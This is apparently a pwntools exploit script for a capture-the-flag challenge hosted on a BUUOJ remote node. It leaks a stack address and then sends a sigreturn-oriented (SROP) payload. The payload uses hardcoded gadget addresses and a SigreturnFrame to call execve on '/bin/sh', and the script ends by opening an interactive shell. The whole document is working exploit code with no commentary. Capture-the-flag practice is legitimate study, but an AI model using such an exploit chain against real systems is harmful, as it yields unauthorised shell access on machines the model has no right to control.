from pwn import *
context(arch='amd64', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 27845)
elf = ELF('./pwn')

movrax_3B_ret = 0x4004e2
movrax_F_ret = 0x4004DA
syscall = 0x400517

payload = cyclic(0x10)
payload += p64(0x4004ED)
io.sendline(payload)
io.recv(0x20)
stack_addr = u64(io.recv(8)) - 0x118
print(hex(stack_addr))

payload = b'/bin/sh'.ljust(0x10, b'\x00')
payload += p64(movrax_F_ret)
payload += p64(syscall)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload += flat(frame)
io.send(payload)
io.interactive()